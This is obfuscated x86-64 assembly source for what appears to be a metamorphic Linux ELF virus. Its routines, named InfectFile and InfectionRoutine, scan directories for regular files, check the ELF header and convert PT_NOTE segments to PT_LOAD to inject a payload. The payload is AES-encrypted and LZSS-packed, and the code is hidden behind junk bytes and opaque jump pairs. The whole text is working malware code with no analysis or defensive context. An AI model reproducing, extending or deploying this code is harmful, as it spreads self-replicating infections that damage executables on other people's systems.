..@KXqFW1FIA1ZD:
    add         r1, _signature-_start
    jmp         ..@OIgvIuZq92m1
..@tmIBCHcYMMWV:
    push        r3
    sub         rsp, _KEYGEN_OFF_size
    mov         QWORD [rsp+_KEYGEN_OFF.bufferaddr], r1
    jmp         ..@YSknTayYLsTr
..@sqe6xnay1ogZ:
    push        rax
    jmp         $+3
db 0x60
    jb          ..@g53MyjQ2xgJX
    jae         ..@g53MyjQ2xgJX
..@3bK9pl6xTi6Q:
%ifdef X86_64
    or          bl, 101b
%endif
    jmp         $+5
db 0x22, 0x50, 0xb2
    js          ..@7xzVDcxhsoTz
    jns         ..@7xzVDcxhsoTz
..@tAdOnAZm4whu:
    jle         ..@xLi1GPvGBv2V
    jmp         $+3
db 0x50
    jmp         $+4
db 0x8d, 0xfc
    jmp         $+3
db 0xca
    jmp         $+5
db 0xbd, 0x89, 0x3b
    jmp         ..@0o2oM4nf8HGD
..@Xnru4hfscH9K:
    xor         rcx, rcx
    jb          ..@fnreVaw0NouQ
    jae         ..@fnreVaw0NouQ
..@1JecwvIGkwH0:
    VAR         packed, dirs_tmp
    jmp         $+4
db 0x00, 0x7a
    je          ..@4TLwH3pJKSvG
    jne         ..@4TLwH3pJKSvG
..@4tbq5INizsO5:
    mov         DWORD [r2], PT_LOAD
    jmp         $+3
db 0x45
    jmp         ..@eVneTtkh0dFA
..@aQPWMu7JEWlv:
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    jmp         ..@fBYKcD3SB9W2
InfectFile:
    jmp         ..@L88FcPwMQL5Y
..@2Ry8oyOv3CcZ:
    add         rdi, 1
    jmp         ..@Y3LjlB3JNZ25
..@pNy9Bq6a4gzd:
    xor         rax, rax
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    add         r1, e_h.e_shentsize
    jmp         $+3
db 0x50
    jl          ..@T89sjM1aQhhb
    jge         ..@T89sjM1aQhhb
..@qjOCvA9DKJYp:
    jmp         ..@PxiiEGXpbOMb
    jl          ..@bNrX2sLSsm2Z
    jge         ..@bNrX2sLSsm2Z
..@oIJmTAKf5jq5:
    call        ConvertXorToMoveZero
    jmp         $+3
db 0xe7
    js          ..@C1rvp62M5x3u
    jns         ..@C1rvp62M5x3u
..@jPX2fNx0ZtUb:
    xchg        rax, rax
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         $+5
db 0x34, 0xd0, 0x60
    jmp         $+3
db 0xc2
    js          ..@qSb8tbYaNYLO
    jns         ..@qSb8tbYaNYLO
..@v7MxfUkbqGA1:
%ifdef X86_64
    je          ..@TlOOr11ZBt9S
    cmp         dx, 2d48h
    je          ..@TlOOr11ZBt9S
%endif
    jmp         $+4
db 0xeb, 0x3d
    js          ..@VZKlBXNzwUfd
    jns         ..@VZKlBXNzwUfd
..@UmWkEOupZkJb:
    push        rdx
    jmp         $+4
db 0x1e, 0x29
    je          ..@pLZIe6cu0NYP
    jne         ..@pLZIe6cu0NYP
..@09pAhJT3sNU6:
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         $+3
db 0x9c
    jb          ..@GWmDfMv9tB49
    jae         ..@GWmDfMv9tB49
..@VEwh68rduqhv:
    jmp         ..@4TLwH3pJKSvG
    jmp         $+3
db 0x43
    jmp         ..@1JecwvIGkwH0
..@Y5tsdvzIXQLj:
    jl          ..@IauXyyUkTlfg
    jmp         ..@n53hxjENP8cr
..@5IaScHszcnAj:
    test        al, al
    js          ..@0VtK0W4Ng6yP
    jns         ..@0VtK0W4Ng6yP
..@HuWVhYYpnJbu:
    mov         r2, r1
    jmp         $+5
db 0x3c, 0x40, 0x80
    jmp         ..@IF8jho9rOEpW
..@hn60zTEVj66E:
    call        UnmapFile
    js          ..@hzqonFkwa0zd
    jns         ..@hzqonFkwa0zd
..@oXHvF2Fg7pSY:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    jmp         $+4
db 0xf0, 0xbe
    jmp         $+4
db 0x35, 0x91
    jb          ..@IauXyyUkTlfg
    jae         ..@IauXyyUkTlfg
..@qbLReQ7Aj83z:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x60]
    aesenc      xmm0, xmm1
    jmp         $+3
db 0x75
    jmp         $+3
db 0xed
    jmp         ..@lyzBJwrGrGW7
..@0qVCOCZBFNbP:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev+2]
    jb          ..@p0Gy9xUfE99U
    jae         ..@p0Gy9xUfE99U
..@fhEDJeBM9zcv:
    xor         rdx, rdx
    jmp         $+5
db 0xbc, 0xcd, 0x74
    je          ..@5PHOpa1zCQ8D
    jne         ..@5PHOpa1zCQ8D
..@4PkcoYkWerCd:
    add         r2, r1
    jmp         ..@AlCIMEHe9YVn
..@Lm8yh7WL9pGS:
    jge         ..@7e2aXlpBXe51
    jmp         ..@WDdG6u15BpYv
..@SCHpYh034MqT:
    mov         rsi, rsi
    je          ..@LlNUVQiJMpXB
    jne         ..@LlNUVQiJMpXB
..@Ibj0OQjbgSrP:
    mov         rax, 2
    jmp         $+3
db 0x4c
    jmp         $+5
db 0xa8, 0x17, 0x6d
    je          ..@iaPPKiTMqQYj
    jne         ..@iaPPKiTMqQYj
..@H638HcuwPAAg:
%ifdef X86_64
    mov         DWORD [rsi+rcx], ebx
%endif
    jmp         $+5
db 0xc4, 0xf9, 0x79
    js          ..@eH47zTGMIIpe
    jns         ..@eH47zTGMIIpe
..@lVozmunRPfEm:
    test        eax, eax
    jmp         ..@OFqzdbC12gcU
..@YrOYgxvDdIpW:
    add         rdi, rax
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         $+4
db 0xfa, 0x7a
    jmp         ..@EDEIJorH3d7j
..@2N2mmGuk3rjq:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    test        al, al
    jmp         ..@YHdhUORXmRHW
..@7GuOi2ab2T0u:
%ifdef X86_64
    mov         rbx, rbx
%endif
    jmp         $+4
db 0xc6, 0x40
    jl          ..@WVkNRL02eBdX
    jge         ..@WVkNRL02eBdX
..@9J9gtYrw63MD:
    mov         DWORD [rdi], eax
    add         rdi, 4
    xchg        rdi, rdi
    jmp         $+3
db 0x0b
    jmp         ..@Udnsd5qlOxRH
..@5n6RZyp0Y76N:
    and         dl, 1110b
    jmp         $+5
db 0xa2, 0xb5, 0x67
    jmp         ..@UStsjQNED1Gk
..@A65JWGkUowQL:
    cmp         BYTE [r2], 0x0
    jz          ..@IjVleKN9pNVo
    movzx       rax, BYTE [r2]
    jmp         $+3
db 0xf8
    je          ..@D1ORj64AVvoe
    jne         ..@D1ORj64AVvoe
..@xu3VqM8Aihxl:
    mov         rcx, rcx
    jmp         $+3
db 0xb7
    js          ..@1Ol4pjDNAHDV
    jns         ..@1Ol4pjDNAHDV
..@Kff1FObCq4g0:
    xor         rax, rax
    jl          ..@86d358r5NbsN
    jge         ..@86d358r5NbsN
..@1QjvQ8ebtmIL:
    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    mov         rcx, rcx
    jb          ..@BPeppR8prriG
    jae         ..@BPeppR8prriG
..@qFjvpHbIehdK:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    je          ..@vKAN36OYPn6K
    jne         ..@vKAN36OYPn6K
..@nKceLtus0mx8:
    xor         rax, rax
    jmp         $+5
db 0xf7, 0xef, 0xa9
    jmp         $+4
db 0xf0, 0x07
    jmp         ..@AlqeDeU8ylOV
..@DZjvEgeF4NIs:
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    jmp         $+5
db 0x97, 0x77, 0xbc
    jmp         $+4
db 0x2b, 0x60
    jmp         ..@5VDFkOiWqrFs
..@FouWVP07bMGj:
%ifdef X86_64
    shr         rdi, 32
    rep         nop
    mov         WORD [rsi+rcx], di
%endif
    js          ..@oLQwLvQp61SC
    jns         ..@oLQwLvQp61SC
..@y4sXC6r5rvB6:
    je          ..@7e2aXlpBXe51
    je          ..@fj9XVPcTSpdx
    jne         ..@fj9XVPcTSpdx
..@BKaoTHzsmgTZ:
%ifndef ENABLE_DEBUGGING
    xchg        rsp, rsp
%endif
    jmp         $+5
db 0x3d, 0x9a, 0x4f
    jmp         $+4
db 0x84, 0x04
    jmp         ..@VONZZlattL7P
..@PnV3owMWayOi:
    add         rsi, rdx
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    xchg        rdx, rdx
    jl          ..@9Yore8J3Ar1V
    jge         ..@9Yore8J3Ar1V
..@7wuNvhBbXtak:
    mov         esi, DWORD [rdi]
    jmp         $+4
db 0xcb, 0xf4
    jmp         $+4
db 0x8f, 0x0d
    je          ..@jsqt50ZBtoXM
    jne         ..@jsqt50ZBtoXM
..@0MFgA6liNzKy:
    add         rdi, rcx
    jmp         ..@CugzcQdcmrGw
..@SvblXKny3BMv:
%ifdef X86_64
    cmp         dl, 48h
    push        rbx
%endif
    jmp         $+5
db 0xfe, 0xd7, 0x16
    jl          ..@BLSMEZmodf94
    jge         ..@BLSMEZmodf94
..@vONsixJT7Ee7:
    add         r1, 1
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         ..@mnM7yZfp6OUp
..@C1qONFjTU9u1:
    pop         rbx
    xchg        rdx, rdx
    jmp         $+4
db 0x1d, 0x53
    jb          ..@h7EBn3ldMjs5
    jae         ..@h7EBn3ldMjs5
..@Cx9Okgs1Nfhg:
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    jmp         $+3
db 0x94
    js          ..@QOFtfvHFf8Jv
    jns         ..@QOFtfvHFf8Jv
..@GJZQ7h7f8iwI:
    je          ..@IvCgQuVXU7N6
    xchg        rdx, rdx
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    jb          ..@zB57IGGXrttJ
    jae         ..@zB57IGGXrttJ
..@mI28DWwDgiwE:
    jne         ..@FHu5TkFyCC6y
    jb          ..@4T7V149Ik8Xd
    jae         ..@4T7V149Ik8Xd
..@a6IAqZb6helX:
    push        rsi
    jb          ..@CWSSXccIwlDY
    jae         ..@CWSSXccIwlDY
..@gWtpPl33cQnD:
    call        IsNum
    jmp         ..@QRVaUIRVrcyj
..@7xzVDcxhsoTz:
    xor         rcx, rcx
    xor         rsi, rsi
    jmp         ..@cHa50gU7bTcm
..@Zm2TvjvIZl3A:
    call        MapFile
    jmp         $+5
db 0x8a, 0x52, 0x6f
    jmp         $+5
db 0xaf, 0x62, 0xb7
    js          ..@IVW9QWLYZRo8
    jns         ..@IVW9QWLYZRo8
..@s5IB0ReV6EkB:
%ifndef ENABLE_DEBUGGING
    mov         r3d, 0x6
%endif
    jl          ..@C0yGW2uoTFzi
    jge         ..@C0yGW2uoTFzi
..@KEFW8LkDlusu:
    pop         rcx
    jmp         ..@biJ7Z9qkJEFA
..@9PwI0SKp0zP1:
    jmp         ..@VIudUbte6qRw
    jmp         $+4
db 0x93, 0x9c
    jmp         ..@NX0qQAFhp98l
..@aaekX8IasOwL:
    CFILE       DWORD [r5+file.filefd]
    mov         DWORD [r5+file.filefd], 0x00
    jmp         $+5
db 0xcd, 0xf9, 0x80
    js          ..@rrKTaVmynmQU
    jns         ..@rrKTaVmynmQU
..@6QDPiTvFlx1q:
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    xchg        rbx, rbx
    jl          ..@AyyYVigYT09L
    jmp         $+5
db 0x8d, 0xcb, 0xf2
    jmp         ..@cXnNBqRNpjym
..@lvOB76B4yRNp:
%ifdef X86_32
    pop         rsi
    mov         rcx, rcx
%endif
    jmp         $+4
db 0x16, 0x5f
    jmp         $+5
db 0x47, 0x63, 0x1b
    jmp         $+4
db 0x82, 0x47
    jmp         ..@3lXGz0mOJNRM
InfectionRoutine:
    jmp         ..@xT3xIuweLs99
..@c7V9mQJazoyq:
    pop         rax
    xor         rax, rax
    jmp         $+5
db 0xd4, 0xea, 0xf9
    js          ..@7u9bB4DxHK16
    jns         ..@7u9bB4DxHK16
..@7sPSfyQ35Oiw:
    add         rdi, 5
    jmp         $+3
db 0x55
    jmp         $+3
db 0xf3
    jmp         $+3
db 0xdc
    js          ..@PuO28pFapOXJ
    jns         ..@PuO28pFapOXJ
..@zJIF0qgAuTK8:
    push        rbx
    pop         rbx
    xchg        rbx, rbx
    jmp         $+3
db 0x3b
    je          ..@6V92feddJx9d
    jne         ..@6V92feddJx9d
..@PZNWre65f2jC:
    xchg        rsi, rsi
    call        GetNewProgramVaddr
    jmp         ..@0p2tZLHcAMNx
..@6N9hEE3pzfwx:
    rep         nop
    jmp         $+4
db 0x96, 0x6b
    jb          ..@zZb5GYqyaq4X
    jae         ..@zZb5GYqyaq4X
..@8kQVC4svHz7I:
    and         ebx, 00000111b
    and         edx, 00111000b
    jb          ..@bSzUzZa4KWmt
    jae         ..@bSzUzZa4KWmt
..@n9avBMwK0P9X:
    add         r1, non_packed_len+PADDING
    push        rbx
    js          ..@mDOd6T0xnf16
    jns         ..@mDOd6T0xnf16
..@7WziDKAWlhTF:
    mov         r3, rax
    and         r5, (PAGE_SIZE-1)
    jb          ..@tfhwo4XLgf1e
    jae         ..@tfhwo4XLgf1e
..@qghZT6PDYCta:
    cmp         DWORD [r1], 0x464c457f
    jne         ..@b4Q6YQEBTlxQ
    jl          ..@e7HUtGFqQ1pw
    jge         ..@e7HUtGFqQ1pw
..@kjKP5jcZyYKP:
    pop         rax
    mov         rax, rdi
    jmp         $+5
db 0x6c, 0xf5, 0xa5
    jmp         $+4
db 0x9f, 0x92
    jb          ..@kHdEfm0emLQq
    jae         ..@kHdEfm0emLQq
..@IbBzKP5fvId8:
    pop         rsi
    jl          ..@xGQ7GtefNnxB
    je          ..@j50PfFeHeVWY
    jne         ..@j50PfFeHeVWY
..@lNu7oWQuelNn:
    xor         rdx, rdx
    je          ..@NGxxuQvjYpC7
    jne         ..@NGxxuQvjYpC7
..@IOgO0JemUnV7:
%ifdef X86_64
    pop         rdi
    xchg        rdi, rdi
%endif
    jmp         $+5
db 0xa1, 0xf3, 0x83
    jmp         ..@gHCuFbDsdqkf
..@0ColaOZtRaxd:
%ifdef X86_64
    and         edx, 0fffff8ffh
%endif
    jmp         $+3
db 0x68
    jmp         ..@GfzHvAleB7Zy
..@aiF2eaX1Jk2X:
    add         rdi, 2
    jmp         ..@df3ybEaxWVTu
..@m1noplViEXiT:
    cmp         WORD [r1], './'
    je          ..@7e2aXlpBXe51
    jmp         $+3
db 0x0e
    jmp         $+4
db 0xc7, 0x2d
    js          ..@mADHDEp9ERG3
    jns         ..@mADHDEp9ERG3
..@XUI9t2KSIoFS:
    syscall
    jmp         $+5
db 0x6f, 0xb4, 0x74
    je          ..@d68R8DVa4692
    jne         ..@d68R8DVa4692
..@GwlgQ00yLZiG:
    add         r5, rax
    jmp         $+5
db 0x3b, 0x31, 0x04
    jb          ..@UmWkEOupZkJb
    jae         ..@UmWkEOupZkJb
..@NxxpcGb1oDgZ:
    mov         QWORD [r2+p_h.p_memsz], r4
    jmp         $+4
db 0x6b, 0xe8
    jmp         $+4
db 0xb7, 0x33
    jmp         ..@fjUh8o7i0z87
..@hO1gDhErkHEj:
    jz          ..@V23Bwdjln4BJ
    jmp         $+3
db 0x55
    jmp         $+3
db 0x6a
    je          ..@zcjuI0RlxM6o
    jne         ..@zcjuI0RlxM6o
..@zxX0SsVbvDhz:
    xor         rax, rax
    jmp         $+4
db 0x99, 0x64
    jmp         $+5
db 0x01, 0x1f, 0xbc
    jl          ..@bzC7T4xS0SQS
    jge         ..@bzC7T4xS0SQS
..@g65QWTvWiKQI:
    je          ..@rpCZppoGOZPE
    jmp         $+3
db 0x79
    js          ..@xQhcMauL173n
    jns         ..@xQhcMauL173n
..@jN6i79JAdeN0:
    pop         rdi
    mov         rsp, rsp
    xor         rax, rax
    jmp         $+5
db 0xb7, 0xfc, 0x35
    js          ..@71DQgWYiFugP
    jns         ..@71DQgWYiFugP
..@bccJwjkLKhZf:
%ifdef X86_64
    mov         rax, rax
%endif
    jmp         $+3
db 0x6c
    jmp         $+4
db 0xff, 0xe9
    jl          ..@3qU1T24gIuTC
    jge         ..@3qU1T24gIuTC
..@KudWXLVhmzU1:
    cmp         DWORD [r2+rax], PT_NOTE
    jne         ..@5anxMG9gLIfj
    jmp         $+3
db 0x9b
    jl          ..@ivT9Y9vN6KJc
    jge         ..@ivT9Y9vN6KJc
..@OIgvIuZq92m1:
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
    jb          ..@BfVpZN5rst6N
    jae         ..@BfVpZN5rst6N
..@T7Mu8TFMOxd2:
    pxor        xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x10]
    aesenc      xmm0, xmm1
    jmp         $+5
db 0x19, 0x74, 0xaf
    jmp         $+5
db 0xeb, 0x03, 0x24
    jmp         $+4
db 0x2b, 0x98
    jl          ..@koSxIbzlLK85
    jge         ..@koSxIbzlLK85
..@OK0Tga2slMzX:
    syscall
    xor         r1, r1
    mov         rbx, rbx
    jmp         $+3
db 0x88
    jb          ..@aaekX8IasOwL
    jae         ..@aaekX8IasOwL
..@AaXdwZqu4OcY:
    cmp         dl, 0fh
    jmp         $+4
db 0x45, 0xdd
    jmp         $+4
db 0x5d, 0x23
    jmp         ..@OmRC0gXF7WJv
..@BXbNSDPmerc2:
    xor         r1, r1
    jmp         ..@1uNEt7Y4e7Q4
..@10Wu4Ee9SWX9:
%ifdef X86_64
    or          dl, 100b
    shr         rax, 8
%endif
    je          ..@UOf7ZHcYH6SJ
    jne         ..@UOf7ZHcYH6SJ
..@71c3hgOu7YKt:
    push        rbx
    pop         rbx
    jl          ..@almBdB1MqCbm
    jge         ..@almBdB1MqCbm
..@lRoNgltbvzT1:
%ifdef X86_64
    mov         rsp, rsp
    mov         rcx, rdx
%endif
    jmp         $+3
db 0x54
    jmp         ..@nOGHPiRC8L7w
..@75iFbhqJqWGS:
    rep         nop
    jmp         ..@WUgoiN76opmE
..@PVDLXW8e3buZ:
    cmp         BYTE [r5], DT_REG
    jne         ..@7e2aXlpBXe51
    jmp         $+5
db 0x0e, 0x86, 0xf7
    jmp         $+3
db 0x1b
    jmp         $+5
db 0x22, 0x44, 0x13
    jmp         ..@N42TmkDWhs6M
..@YW3y4vo3EoqX:
    pop         r2
    jmp         ..@4d0yjofYkuGQ
..@idlx33sMc0LI:
%ifdef X86_32
    push        rax
    pop         rax
    mov         esi, 0x22
%endif
    jmp         $+3
db 0x8c
    jmp         ..@PDRtXRHMklhX
..@489SSuZHEZaj:
    jz          ..@PNvA7DNCMUcm
    jmp         $+4
db 0x3a, 0x6f
    jmp         $+3
db 0x75
    jl          ..@qVSrfKtsPMiP
    jge         ..@qVSrfKtsPMiP

_eof:
